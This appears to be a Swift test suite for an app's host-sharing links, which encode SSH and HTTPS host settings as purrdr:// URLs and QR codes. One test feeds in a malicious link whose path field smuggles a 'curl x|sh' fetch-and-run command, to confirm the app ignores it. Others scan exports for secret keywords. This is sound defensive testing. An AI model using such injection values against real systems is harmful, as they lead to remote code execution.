import Foundation
import PurrdrCore
import Testing

/// 主機分享連結(QR code 與分享連結匯出匯入主機設定)。內容永不含私鑰或密碼。
@Suite("主機分享連結")
struct HostShareLinkTests {
    static let pin = HostKeyFingerprint(stored: "COBpO4JIzmE5SXJiDiFEv8QW0IgLEE4H3vB2W6wHLww")!
    static let studio = HostConfiguration(
        name: "Studio Mac", endpoint: SSHEndpoint(host: "studio-mac", port: 2222, username: "demo"),
        herdr: HerdrInstallation(path: "/opt/herdr/bin/herdr", session: "work"), operatingSystem: .macOS, hostKeyPin: pin)

    @Test("匯出再匯入：名稱、位址、埠、使用者、連線方式、session、host key 指紋都還原(herdr 路徑不帶)")
    func roundTrip() throws {
        let url = HostShareLink.url(for: Self.studio)

        let shared = try HostShareLink.decode(url)

        #expect(url.scheme == "purrdr")
        #expect(url.host() == "host")
        #expect(shared == SharedHost(
            name: "Studio Mac", endpoint: SSHEndpoint(host: "studio-mac", port: 2222, username: "demo"),
            connectionMethod: .tailscaleSSH, herdr: HerdrInstallation(path: "herdr", session: "work"),
            hostKeyPin: Self.pin))
    }

    @Test("分享連結不帶 herdr 路徑(匯入後會被當成指令執行)")
    func exportOmitsHerdrPath() throws {
        let url = HostShareLink.url(for: Self.studio)

        let json = try JSONSerialization.jsonObject(with: Self.payload(of: url))
        let object = try #require(json as? [String: Any])

        #expect(object["herdr"] == nil)
        #expect(!String(decoding: try Self.payload(of: url), as: UTF8.self).contains("/opt/herdr"))
    }

    @Test("連結裡的 herdr 路徑(舊版連結或惡意連結)匯入時一律忽略，用預設值")
    func importIgnoresHerdrPathInLink() throws {
        let payload = #"{"v":1,"name":"Evil","host":"h","port":22,"user":"u","herdr":"/tmp/evil;curl x|sh","session":"work"}"#
        let encoded = Data(payload.utf8).base64EncodedString()
            .replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_").replacingOccurrences(of: "=", with: "")

        let shared = try HostShareLink.decode(URL(string: "purrdr://host?d=\(encoded)")!)

        #expect(shared.herdr == HerdrInstallation(path: "herdr", session: "work"))
    }

    /// 白名單：分享內容只有這些欄位。主機設定之後加入密碼、私鑰、passphrase 等祕密時，
    /// 這裡不會自動多出欄位;有人把祕密加進分享內容時這個測試會失敗。
    @Test("匯出內容只有白名單欄位，不含任何祕密(私鑰、密碼、passphrase)")
    func exportContainsNoSecrets() throws {
        let url = HostShareLink.url(for: Self.studio)
        let json = try JSONSerialization.jsonObject(with: Self.payload(of: url))
        let object = try #require(json as? [String: Any])

        #expect(Set(object.keys) == ["v", "name", "host", "port", "user", "method", "session", "pin"])
        let text = url.absoluteString.lowercased() + String(decoding: try Self.payload(of: url), as: UTF8.self).lowercased()
        for word in ["password", "passphrase", "private", "secret", "-----begin"] {
            #expect(!text.contains(word), "分享內容出現了 \(word)")
        }
    }

    @Test("預設的 herdr 與 session、沒有 pin 的主機:匯入後仍是預設值")
    func defaultsRoundTrip() throws {
        let plain = HostConfiguration(name: "Box", endpoint: SSHEndpoint(host: "100.64.0.9", username: "ops"))

        let shared = try HostShareLink.decode(HostShareLink.url(for: plain))

        #expect(shared.herdr == HerdrInstallation())
        #expect(shared.hostKeyPin == nil)
        #expect(shared.endpoint.port == 22)
    }

    @Test("不是主機分享連結、內容壞掉、版本不認得、埠不合法：一律拒絕")
    func rejectsInvalidLinks() throws {
        let valid = HostShareLink.url(for: Self.studio)
        var components = try #require(URLComponents(url: valid, resolvingAgainstBaseURL: false))

        #expect(throws: HostShareLinkError.notAHostLink) { try HostShareLink.decode(URL(string: "purrdr://settings")!) }
        #expect(throws: HostShareLinkError.notAHostLink) { try HostShareLink.decode(URL(string: "https://host/?d=x")!) }
        #expect(throws: HostShareLinkError.malformed) { try HostShareLink.decode(URL(string: "purrdr://host?d=%%%")!) }
        #expect(throws: HostShareLinkError.malformed) { try HostShareLink.decode(URL(string: "purrdr://host")!) }

        components.queryItems = [URLQueryItem(name: "d", value: Self.encode(["v": 99, "name": "x", "host": "h", "port": 22, "user": "u"]))]
        #expect(throws: HostShareLinkError.unsupportedVersion) { try HostShareLink.decode(components.url!) }

        components.queryItems = [URLQueryItem(name: "d", value: Self.encode(["v": 1, "name": "x", "host": "h", "port": 70_000, "user": "u"]))]
        #expect(throws: HostShareLinkError.malformed) { try HostShareLink.decode(components.url!) }

        components.queryItems = [URLQueryItem(name: "d", value: Self.encode(["v": 1, "name": " ", "host": "h", "port": 22, "user": "u"]))]
        #expect(throws: HostShareLinkError.malformed) { try HostShareLink.decode(components.url!) }

        // HTTPS 主機沒有主機服務位址，或位址不合法。
        components.queryItems = [URLQueryItem(
            name: "d", value: Self.encode(["v": 1, "name": "x", "host": "h", "port": 443, "user": "", "method": "https"]))]
        #expect(throws: HostShareLinkError.malformed) { try HostShareLink.decode(components.url!) }
        components.queryItems = [URLQueryItem(
            name: "d",
            value: Self.encode(["v": 1, "name": "x", "host": "h", "port": 443, "user": "", "method": "https", "url": "http://h.ts.net"]))]
        #expect(throws: HostShareLinkError.malformed) { try HostShareLink.decode(components.url!) }
    }

    static let httpsAddress = HostServiceAddress("studio.tail1234.ts.net")!

    @Test("HTTPS 主機匯出再匯入：名稱、連線方式與主機服務位址都還原")
    func httpsRoundTrip() throws {
        let https = HostConfiguration(name: "Studio", hostService: Self.httpsAddress)

        let shared = try HostShareLink.decode(HostShareLink.url(for: https))

        #expect(shared.name == "Studio")
        #expect(shared.connectionMethod == .https)
        #expect(shared.hostService == Self.httpsAddress)
        #expect(shared.hostKeyPin == nil)
    }

    @Test("帶埠號的 HTTPS 主機分享後仍是同一個埠(#218)")
    func httpsPortSurvivesSharing() throws {
        let address = try #require(HostServiceAddress("https://studio.tail1234.ts.net:8443"))
        let url = HostShareLink.url(for: HostConfiguration(name: "Studio", hostService: address))
        let object = try #require(try JSONSerialization.jsonObject(with: Self.payload(of: url)) as? [String: Any])

        let shared = try HostShareLink.decode(url)

        #expect(shared.hostService == address)
        #expect(object["url"] as? String == "https://studio.tail1234.ts.net:8443")
        #expect(object["port"] as? Int == 8443)
    }

    @Test("HTTPS 主機的匯出內容只有白名單欄位，不含裝置權杖或配對碼")
    func httpsExportContainsNoDeviceToken() throws {
        let url = HostShareLink.url(for: HostConfiguration(name: "Studio", hostService: Self.httpsAddress))
        let object = try #require(try JSONSerialization.jsonObject(with: Self.payload(of: url)) as? [String: Any])

        #expect(Set(object.keys) == ["v", "name", "host", "port", "user", "method", "url"])
        #expect(object["url"] as? String == "https://studio.tail1234.ts.net")
        let text = String(decoding: try Self.payload(of: url), as: UTF8.self).lowercased()
        for word in ["token", "code", "secret", "bearer"] {
            #expect(!text.contains(word), "分享內容出現了 \(word)")
        }
    }

    @Test("連結夠短，可以放進 QR code(低於 version 40 的 2953 bytes 很多)")
    func linkFitsInQRCode() {
        var long = Self.studio
        long.name = String(repeating: "長", count: 60)
        #expect(HostShareLink.url(for: long).absoluteString.utf8.count < 1_000)
    }

    // MARK: -

    static func payload(of url: URL) throws -> Data {
        let value = try #require(URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems?.first { $0.name == "d" }?.value)
        var base64 = value.replacingOccurrences(of: "-", with: "+").replacingOccurrences(of: "_", with: "/")
        base64 += String(repeating: "=", count: (4 - base64.count % 4) % 4)
        return try #require(Data(base64Encoded: base64))
    }

    static func encode(_ object: [String: Any]) -> String {
        let data = try! JSONSerialization.data(withJSONObject: object)
        return data.base64EncodedString().replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_")
            .replacingOccurrences(of: "=", with: "")
    }
}
